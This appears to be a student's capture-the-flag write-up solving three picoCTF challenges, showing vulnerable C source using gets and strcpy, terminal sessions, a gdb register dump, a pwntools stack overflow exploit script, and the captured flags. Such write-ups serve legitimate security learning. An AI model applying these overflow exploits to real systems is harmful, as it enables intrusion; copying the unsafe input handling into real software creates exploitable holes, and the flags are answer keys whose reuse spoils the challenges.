# 1.buffer overflow 0:
> Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here.
Connect using:
nc saturn.picoctf.net 64086

## Solution:
- I first examined the `vuln.c` file provided and saw :
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```
- it reads `flag.txt` into `flag` then installs a `SIGSEGV` handler that prints flag.
- It reads user input with `gets(buf1)` then calls `vuln(buf1)`.
- vuln does `strcpy(buf2, input)` into a 16-byte `buf2` causing stack buffer overflow.
- If you overwrite that return address with an invalid/unmapped address, the `ret` will jump there and cause a segmentation fault , the signal handler runs and prints the flag.
- I thus typed in random letter `a` to cross the 32 bit mark and was thus able to cause a seg fault and obtain the flag.
```
 nc saturn.picoctf.net 64086
Input: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```
## Flag:
`picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}`

# 2.format string 0:
> Can you use your knowledge of format strings to make the customers happy?
Download the binary here.
Download the source here.
Connect with the challenge instance here:
nc mimas.picoctf.net 52477

## Solution:
- The `%` sign in format specifiers helped me understand that I needed to choose the option where it is presebt and was able to get the flag.
```
$ nc mimas.picoctf.net 52477
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_74f6c0e7}
```
## Flag:
`picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_74f6c0e7}`

# 3.clutter overflow
> Clutter, clutter everywhere and not a byte to use.
nc mars.picoctf.net 31890

## Solution:
- I first check the file type
```
 $ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=181b4752cc92cfa231c45fe56676612e0ded947a, not stripped
```
- Next , I used `checksec`.
```
 Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
- 64-bit binary call chall.
- here NX[No-execute bit] is enabled so we wont directly as the user be able to execute the code.
- I then opened the `chall.c` file and saw the following:
```
#include <stdio.h>
#include <stdlib.h>

#define SIZE 0x100
#define GOAL 0xdeadbeef

const char* HEADER = 
" ______________________________________________________________________\n"
"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|\n"
"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |\n"
"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|\n"
"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \\^ ^ |\n"
"|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \\ ^ _ ^ / |                | \\^ ^|\n"
"| ^/_\\^ ^ ^ /_________\\^ ^ ^ /_\\ | //  | /_\\ ^| |   ____  ____   | | ^ |\n"
"|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|\n"
"| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |\n"
"|^ ^ ^ ^ ^| /     (   \\ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \\|^ ^|\n"
".-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |\n"
"|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\\ |^ ^|\n"
"| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |\n"
"|'.____'_^||/!\\@@@@@/!\\|| _'______________.'|==                    =====\n"
"|\\|______|===============|________________|/|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\" ||\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"  \n"
"\"\"''\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"";

int main(void)
{
  long code = 0;
  char clutter[SIZE];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);
 	
  puts(HEADER); 
  puts("My room is so cluttered...");
  puts("What do you see?");

  gets(clutter);


  if (code == GOAL) {
    printf("code == 0x%llx: how did that happen??\n", GOAL);
    puts("take a flag for your troubles");
    system("cat flag.txt");
  } else {
    printf("code == 0x%llx\n", code);
    printf("code != 0x%llx :(\n", GOAL);
  }

  return 0;
}
```
- this code basically compares the value of `code` to `GOAL` which is set to `0xdeadbeef`. If `code==GOAL` , then the flag will be printed , else no.
- now , When I ran `chall.c` , I obtained this text , in which if I typed something random like hello , it wouldnt accept it as it isn't equal to `0xdeadbeef` but when I put that in , it did not work either . So, there needed to be a buffer overflow for it to work.
```
$ nc mars.picoctf.net 31890
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
0xdeadbeef
code == 0x0
code != 0xdeadbeef :(
```
- I found out that `gets` is unsafe to use as it is vulnerable to buffer overflow but here we can exploit this vulnerability .
- as the code is `0xdeadbeef` but it wont accept it , we have to overwrite `code` with `0xdeadbeef` so `code==GOAL` holds true and prints the flag.
- I ran `gdb -q chall` followed by `r < chall` and found a segmentation fault and noticed that code doesn't equal to 0x0 but some large hexadecimal.
```
$ gdb -q chall
Reading symbols from chall...
(No debugging symbols found in chall)
During startup program exited with code 1.
(gdb) r < chall
Starting program: /mnt/c/Users/drsan/Downloads/chall < chall
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
code == 0x248
code != 0xdeadbeef :(

Program received signal SIGSEGV, Segmentation fault.
0x0000000000200000 in ?? ()
```

- next , I ran `info registers`
```
(gdb) info registers
rax            0x0                 0
rbx            0x0                 0
rcx            0x7ffff7d148f7      140737351076087
rdx            0x0                 0
rsi            0x7fffffffbf20      140737488338720
rdi            0x7fffffffbe00      140737488338432
rbp            0x280               0x280
rsp            0x7fffffffe160      0x7fffffffe160
r8             0x16                22
r9             0x7fffffffbdb0      140737488338352
r10            0x0                 0
r11            0x246               582
r12            0x7fffffffe268      140737488347752
r13            0x4006c7            4196039
r14            0x0                 0
r15            0x7ffff7ffd040      140737354125376
rip            0x200000            0x200000
eflags         0x10202             [ IF RF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
k0             0xe0ee0f0           235856112
k1             0xf00108            15728904
k2             0x0
```
- here `rbp` looks similar to the hex that the code was equal to ,this is what we need to find out the offset that we overflowed our buffer at.
- using the script , i was able to obtain the local flag not the real one.
```
$ python3 - <<'PY'
from pwn import *
> print(cyclic_find(0x280))
PY
-1
alien2709@BORKARS:/mnt/c/Users/drsan/Downloads$ cd chall
-bash: cd: chall: Not a directory
alien2709@BORKARS:/mnt/c/Users/drsan/Downloads$ nano cyclic_find.py
alien2709@BORKARS:/mnt/c/Users/drsan/Downloads$ python3 cyclic_find.py 0x280
Pattern not found (try increasing pattern size)
alien2709@BORKARS:/mnt/c/Users/drsan/Downloads$ nano cyclic_find.py
alien2709@BORKARS:/mnt/c/Users/drsan/Downloads$ python3 cyclic_find.py 0x280
Traceback (most recent call last):
  File "/mnt/c/Users/drsan/Downloads/cyclic_find.py", line 36, in <module>
    off = find_offset(sys.argv[1])
  File "/mnt/c/Users/drsan/Downloads/cyclic_find.py", line 22, in find_offset
    pattern = make_pattern(10000)  # large enough
  File "/mnt/c/Users/drsan/Downloads/cyclic_find.py", line 11, in make_pattern
    if len("".join(pat)) >= length:
TypeError: sequence item 0: expected str instance, int found
alien2709@BORKARS:/mnt/c/Users/drsan/Downloads$ from pwn import *
Command 'from' not found, but can be installed with:
sudo apt install mailutils
alien2709@BORKARS:/mnt/c/Users/drsan/Downloads$ from pwn import *
Command 'from' not found, but can be installed with:
sudo apt install mailutils
alien2709@BORKARS:/mnt/c/Users/drsan/Downloads$ python3 - <<'s'
> from pwn import *
> connect = process('./chall')
> padding = b'A' * 264
> rbp = b'\xef\xbe\xad\xde'
> payload = padding + rbp
> connect.sendlineafter(b'\n', payload)
> output = connect.recvall()
> print(output)
> s
[x] Starting local process './chall'
[+] Starting local process './chall': pid 1682
[x] Receiving all data
[x] Receiving all data: 1.33KB
[x] Receiving all data: 1.40KB
[x] Receiving all data: 1.44KB
[+] Receiving all data: Done (1.44KB)
[*] Process './chall' stopped with exit code 0 (pid 1682)
b'|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|\n| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |\n|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|\n| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \\^ ^ |\n|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \\ ^ _ ^ / |                | \\^ ^|\n| ^/_\\^ ^ ^ /_________\\^ ^ ^ /_\\ | //  | /_\\ ^| |   ____  ____   | | ^ |\n|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|\n| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |\n|^ ^ ^ ^ ^| /     (   \\ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \\|^ ^|\n.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |\n|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\\ |^ ^|\n| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |\n|\'.____\'_^||/!\\@@@@@/!\\|| _\'______________.\'|==                    =====\n|\\|______|===============|________________|/|""""""""""""""""""""""""""\n" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  \n""\'\'""""\'\'"""""""""""""""\'\'""""""""""""""\'\'""""""""""""""""""""""""""""""\n""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""\n"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""\nMy room is so cluttered...\nWhat do you see?\ncode == 0xdeadbeef: how did that happen??\ntake a flag for your troubles\npicoCTF{h1dd3n_1n_1m4g3_92f08d7c}\n'
```
- in order to obtain the actual one , I used:
```
$ python3 exploit.py
[+] Opening connection to mars.picoctf.net on port 31890: Done
[+] Receiving all data: Done (1.44KB)
[*] Closed connection to mars.picoctf.net port 31890
b'|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|\n| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |\n|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|\n| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \\^ ^ |\n|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \\ ^ _ ^ / |                | \\^ ^|\n| ^/_\\^ ^ ^ /_________\\^ ^ ^ /_\\ | //  | /_\\ ^| |   ____  ____   | | ^ |\n|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|\n| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |\n|^ ^ ^ ^ ^| /     (   \\ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \\|^ ^|\n.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |\n|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\\ |^ ^|\n| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |\n|\'.____\'_^||/!\\@@@@@/!\\|| _\'______________.\'|==                    =====\n|\\|______|===============|________________|/|""""""""""""""""""""""""""\n" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  \n""\'\'""""\'\'"""""""""""""""\'\'""""""""""""""\'\'""""""""""""""""""""""""""""""\n""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""\n"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""\nMy room is so cluttered...\nWhat do you see?\ncode == 0xdeadbeef: how did that happen??\ntake a flag for your troubles\npicoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}\n
```
- where `exploit.py` was:
```
from pwn import *
host = 'mars.picoctf.net' #Host to connect to
port = 31890 #Port to connect to
padding = b'A' * 264 #Sending 264 A's to get to our ourflow and to act as padding. We overflow the buffer at 272
rbp = b'\xef\xbe\xad\xde' #We are sending 8 bytes here. So we do 272 - 8 and we get 264 + out bytes to get to the buffer overflow
payload = padding + rbp #Creating our payload
connect = remote(host,port) #Connecting to server
connect.sendlineafter(b'\n', payload) #Sending the payload after we get the new line
output = connect.recvall() #Collecting
print(output) #Printing
```
## Notes:
- did use A.I for this challenge.

## Flag:
`picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}`

